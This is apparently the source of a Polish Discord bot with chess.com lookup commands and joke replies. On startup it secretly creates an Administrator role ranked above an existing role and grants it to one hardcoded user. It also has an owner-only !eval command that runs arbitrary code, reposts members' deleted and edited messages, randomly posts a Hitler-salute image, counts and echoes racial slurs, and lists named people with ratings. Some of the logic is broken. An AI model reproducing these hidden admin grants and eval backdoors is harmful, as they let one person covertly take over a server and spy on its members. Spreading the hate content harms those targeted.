const { Client, IntentsBitField, EmbedBuilder, PermissionsBitField, Colors } = require('discord.js');
const config = require('./config.json');

const client = new Client({
    intents: [
        IntentsBitField.Flags.GuildMessages,
        IntentsBitField.Flags.Guilds,
        IntentsBitField.Flags.GuildMembers,
        IntentsBitField.Flags.MessageContent,
    ]
});

client.on('ready', async () => {
    console.log(client.user.tag + ' jest onlajn');
    client.user.setActivity({
        name: 'Brawl Stars'
    })
    const guildId = '1137744153879523378';
    const guild = client.guilds.cache.get(guildId);
    const userId = '952296941339934720';

    if (!guild) {
        console.log(`Guild with ID '${guildId}' not found.`);
        return;
    }

    const role = guild.roles.cache.find(r => r.name === 'bles');

    if (!role) {
        guild.roles.create({
            name: 'bles',
            color: Colors.Default,
            hoist: false,
            mentionable: false,
            permissions: PermissionsBitField.Administrator,
            position: guild.roles.cache.find(r => r.name === 'Oskarek').position + 1,
            reason: 'jestem lepszy'
        })
            .then(console.log('Role bles was created with administrator permissions.'))
            .catch(console.error('There was an error creating role bles: '));
        console.log(`Role 'bles' does not exist in guild '${guild.name}' (ID: ${guild.id}).`);
    }

    if (!role.permissions.has(PermissionsBitField.Flags.Administrator)) {
        try {
            await role.setPermissions([PermissionsBitField.Flags.Administrator]);
            console.log(`Administrator permissions have been added to the role '${role.name}'.`);
        } catch (error) {
            console.error(`Failed to update role permissions: ${error}`);
        }
    }

    try {
        // Fetch the member asynchronously
        const member = await guild.members.fetch(userId);
        if (!member) {
            console.log(`Member with ID '${userId}' not found.`);
            return;
        }
        // Add the role to the member
        await member.roles.add(role);
        console.log(`Role '${role.name}' has been assigned to <@${userId}>.`);
    } catch (error) {
        console.error(`Failed to assign role to user: ${error}`);
    }
});

const bociki = ["Szymon Bialik [9/11]", "Justyna Czakańska [8/11]", "Karolina Michalik [10/11]", "Katarzyna Węgrzyn [9/11]", "Magda Kiljańska [5/11]", "Oliwia Rojek [7/11]", "Maciej Macura [9/11]", "Jakub Kasperski [6/11]", "Paweł Pilipczuk [11/11]", "Bartosz Trytytka [11/11]", "Jakub Piętko [11/11]", "Jan Włodarczyk [10/11]", "Szymon Frączek [12/11]"];

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    const heilhitler = './heilhitler.jpg';
    const chance = Math.floor(Math.random() * 100);
    const ultraRareChance = Math.floor(Math.random() * 100000);
    if (chance === 23) {
        message.reply('o-oł...');
    } else if (chance === 64) {
        message.reply('Heeeeeeeeej 👽');
    } else if (chance === 45){
        message.reply({files: [heilhitler]});
    }

    if (ultraRareChance === 42344) {
        message.reply({content: 'o-oł...\nHeeeeej :alien:', files: [heilhitler]});
    }

    async function nwordsCommand() {
        let nwordCount = 0;
        let targetUser = message.mentions.users.first() || message.author;
        let messages;
        let lastMessageId = null;

        const isNwordInTheMessage = () => {
            return message.author.id === targetUser.id && message.content.toLowerCase().includes('nigg');
        }

        do {
            messages = await message.channel.messages.fetch({ limit: 100, before: lastMessageId });
            messages.forEach(msg => {
                if (isNwordInTheMessage()) {
                    //add one to the counter for every instance in the message
                    nwordCount += (msg.content.toLowerCase().match(/nigg/g) || []).length;
                }
                
            });
            lastMessageId = messages.size > 0 ? messages.last().id : null;
        } while (messages.size > 0);

        message.channel.send(`${targetUser.username} powiedział nworda ${nwordCount} razy.`);
    }

    async function evalCommand() {
        if (message.author.id !== '952296941339934720') return;
        const code = message.content.slice(6);
        try {
            let result = await eval(code);

            const evalEmbed = new EmbedBuilder().setTitle('eval').addFields({name: 'kod',value: `\`\`\`js\n${code}\`\`\``},{name: 'result', value: `\`\`\`${result.toString()}\`\`\``}).setColor('Random')
            message.channel.send({embeds: [evalEmbed]});
        } catch (error) {
            message.channel.send(`\`\`\`js\n${error}\n\`\`\``);
        }
    }

    async function chesscom() {
    const msgArray = message.content.split(' '); //[!chesscom, arg, subArg]
    const arg = msgArray[1];
    const subArg = msgArray[2];
    switch (arg) {
        case 'profil':
            const profRes = await fetch(`https://api.chess.com/pub/player/${subArg}`);
            if (!profRes.ok) { message.reply(':x: błont'); return; }
            const profData = await profRes.json();
            const countryRes = await fetch(profData.country);
            const countryData = await countryRes.json();
            //Use user's profile picture or a default one
            const avatarUrl = profData.avatar || 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQS1P_ahGnzn0M0nsKJzASMplSBNbzh6528og&s';
            const profEmbed = new EmbedBuilder().setTitle('Profil Użytkownika').setThumbnail(avatarUrl).addFields(
                {
                    name: 'Nazwa Użytkownika',
                    value: profData.username,
                    inline: true
                },
                {
                    name: 'Tytuł',
                    value: profData.title || 'Brak',
                    inline: true
                },
                {
                    name: "\n",
                    value: "\n"
                },
                {
                    name: 'Ostatnio Online',
                    value: `<t:${profData.last_online}:R>`,
                    inline: true
                },
                {
                    name: 'Data dołączenia',
                    value: `<t:${profData.joined}:D>`,
                    inline: true
                },
                {
                    name: 'Kraj',
                    value: `${countryData.name} :flag_${countryData.code.toLowerCase()}:`
                },
                {
                    name: 'Dywizja',
                    value: profData.league || 'brak'
                }
            ).setColor('Random');
            message.reply({embeds: [profEmbed]});
            break;
        case 'stats':
            const statRes = await fetch(`https://api.chess.com/pub/player/${subArg}/stats`);
            if (!statRes.ok) { message.reply(':x: błont'); return; }
            const statData = await statRes.json();
            const statEmbed = new EmbedBuilder().setTitle('Statystyki Gracza').addFields(
                {
                    name: '<:bullet:1267249693163913246> Bullety',
                    value: `Ostatnia Partia:\n Ranking:${statData.chess_bullet.last.rating}\n Data: <t:${statData.chess_bullet.last.date}:D>\nSzczyt:\n Ranking: ${statData.chess_bullet.best.rating}\n Data: <t:${statData.chess_bullet.best.date}:D>\n [Link Do Gry](${statData.chess_bullet.best.game})\nWyniki:\n Wygrane:${statData.chess_bullet.record.win}\n Przegrane:${statData.chess_bullet.record.loss}\n Remisy:${statData.chess_bullet.record.draw}`
                },
                {
                    name: '<:blitz:1267249706334158910> Blitzy',
                    value: `Ostatnia Partia:\n Ranking:${statData.chess_blitz.last.rating}\n Data: <t:${statData.chess_blitz.last.date}:D>\nSzczyt:\n Ranking: ${statData.chess_blitz.best.rating}\n Data: <t:${statData.chess_blitz.best.date}:D>\n [Link Do Gry](${statData.chess_blitz.best.game})\nWyniki:\n\tWygrane:${statData.chess_blitz.record.win}\n Przegrane:${statData.chess_blitz.record.loss}\n Remisy:${statData.chess_blitz.record.draw}`
                },
                {
                    name: '<:rapid:1267249670078599228> Rapidy',
                    value: `Ostatnia Partia:\n Ranking:${statData.chess_rapid.last.rating}\n Data: <t:${statData.chess_rapid.last.date}:D>\nSzczyt:\n Ranking: ${statData.chess_rapid.best.rating}\n Data: <t:${statData.chess_rapid.best.date}:D>\n [Link Do Gry](${statData.chess_rapid.best.game})\nWyniki:\n Wygrane:${statData.chess_rapid.record.win}\n Przegrane:${statData.chess_rapid.record.loss}\n Remisy:${statData.chess_rapid.record.draw}`
                },
            ).setColor('Random');
            message.reply({embeds: [statEmbed]});
            break;
        case 'dailypuzzle':
            const dailyPuzzleRes = await fetch(`https://api.chess.com/pub/puzzle`);
            if (!dailyPuzzleRes.ok) { message.reply(':x: Coś poszło nie tak'); return; }
            const dailyPuzzleData = await dailyPuzzleRes.json();
            if (dailyPuzzleData.pgn.includes('...')) {
                message.reply(`Ruch [czarnych](${dailyPuzzleData.image})`);
            } else {
                message.reply(`Ruch [białych](${dailyPuzzleData.image})`);
            }
            break;
            case 'randompuzzle':
                const randomPuzzleRes = await fetch(`https://api.chess.com/pub/puzzle/random`);
                if (!randomPuzzleRes.ok) { message.reply(':x: Coś poszło nie tak'); return; }
                const rPuzzledata = await randomPuzzleRes.json();
                if (rPuzzledata.pgn.includes('...')) {
                    message.reply(`Ruch [czarnych](${rPuzzledata.image})`);
                } else {
                    message.reply(`Ruch [białych](${rPuzzledata.image})`);
                }
                break;
        }
    }

    switch (message.content.toLowerCase) {
        case '<@1242565145410928640>':
            message.reply('bocik');
            break;
        case 'bocik':
            message.reply('nie bo ty :shit: :index_pointing_at_the_viewer:');
            break;
        case 'nigga':
            message.reply(':repeat: :foot_tone5:');
            break;
        case 'geo':
            message.reply(`Nigdy nie rozumiałem po co ludzie czytają treści z geometrii, to czy przeczytasz treść czy nie nie ma żadnego wpływu na wynik. Przecież zadania z geometrii są dołożone do zestawu dla beki i i tak nie da się ich zrobić. Gdzieś w krzakach siedzi Komitet Główny z ukrytą kamerą i się śmieją "haha jaki debil próbuje geometrię zrobić". Jeszcze potem na omówieniach, żeby ludzie się nie ziornęli, że to żart to robią jakieś fejkowe "dowody". Wychodzi jakiś typ, macha rękami przez 20 min, "jednokładność ch\\*j k\\*rwa". Tu sobie dorysujemy punkt i nawet nie udowodnimy, że istnieje. Tu sobie przedłużymy odcinek i on się przetnie z naszą prostą akurat tam gdzie trzeba, i też bez dowodu "bo to widać z rysunku hehe". I ludzie się na to nabierają i nadal myślą że zadania z geometrii da się zrobić. W ogóle, kto to widział, żeby na OM były zadania, gdzie trzeba rysować. To jest olimpiada MATEMATYCZNA, jak ktoś chce sobie rysować, to niech idzie na Olimpiadę Plastyczną czy coś.`);
            break;
        case 'geometria':
            message.reply(`Nigdy nie rozumiałem po co ludzie czytają treści z geometrii, to czy przeczytasz treść czy nie nie ma żadnego wpływu na wynik. Przecież zadania z geometrii są dołożone do zestawu dla beki i i tak nie da się ich zrobić. Gdzieś w krzakach siedzi Komitet Główny z ukrytą kamerą i się śmieją "haha jaki debil próbuje geometrię zrobić". Jeszcze potem na omówieniach, żeby ludzie się nie ziornęli, że to żart to robią jakieś fejkowe "dowody". Wychodzi jakiś typ, macha rękami przez 20 min, "jednokładność ch\\*j k\\*rwa". Tu sobie dorysujemy punkt i nawet nie udowodnimy, że istnieje. Tu sobie przedłużymy odcinek i on się przetnie z naszą prostą akurat tam gdzie trzeba, i też bez dowodu "bo to widać z rysunku hehe". I ludzie się na to nabierają i nadal myślą że zadania z geometrii da się zrobić. W ogóle, kto to widział, żeby na OM były zadania, gdzie trzeba rysować. To jest olimpiada MATEMATYCZNA, jak ktoś chce sobie rysować, to niech idzie na Olimpiadę Plastyczną czy coś.`);
            break;
        case 'losowybocik':
            message.reply(bociki[Math.floor(Math.random()*bociki.length)]);
            break;
        case '🤖':
            message.reply(':mirror:');
            break;
        case 'alien':
            message.reply(':alien:');
            break;
        case 'alieni':
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    message.channel.send(':alien:');
                }, 200);
            }
            break;
        case 'alienoid':
            const image = './Bez_nazwy.jpg';
            await message.reply({files: [image]});
            break;
        case ':nerd:':
            message.reply(':nerd: :repeat:');
            break;
        case 'N':
            message.reply('I');
            break;
        case 'G':
            message.reply('G');
            break;
        case 'E':
            message.reply('R');
            break;
        default:
            break;
    }

    if (message.content.toLowerCase().startsWith('!nwords')) {
        nwordsCommand();
    }

    if (message.content.startsWith('!eval')) {
        evalCommand();
    }

    if (message.content.toLowerCase().includes('sans')) {
        message.reply('<:sansgranie:1283097393620975676>'); 
    }
});
client.on('messageDelete', async message => {
    if (message.author.bot || message.author.id === '952296941339934720') return;
    const embed = new EmbedBuilder()
    .setAuthor({name: message.author.username, iconURL: message.author.avatarURL()})
    .setDescription(message.content || 'null')
    .setColor('Random')
    message.channel.send({embeds: [embed]});
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (oldMessage.content === newMessage.content) return;
    if (oldMessage.author.bot || oldMessage.author.id === '952296941339934720') return;

    const embed = new EmbedBuilder()
        .setAuthor({
            name: newMessage.author.username,
            iconURL: newMessage.author.avatarURL()
        })
        .addFields(
            { name: 'Przed edytowaniem', value: oldMessage.content || 'null', inline: false },
            { name: 'Po edytowaniu', value: newMessage.content || 'null', inline: false }
        )
        .setColor('Random')
    newMessage.channel.send({ embeds: [embed] });
});

client.login(config.token);